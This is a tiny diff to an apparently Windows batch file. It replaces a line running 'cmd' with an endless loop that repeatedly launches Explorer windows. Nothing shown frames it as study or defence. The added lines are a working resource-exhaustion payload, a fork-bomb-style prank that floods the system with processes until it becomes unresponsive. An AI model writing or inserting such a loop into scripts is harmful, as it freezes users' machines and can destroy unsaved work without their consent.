@@ -1,1 +1,3 @@
-cmd
+:x
+start explorer
+goto x
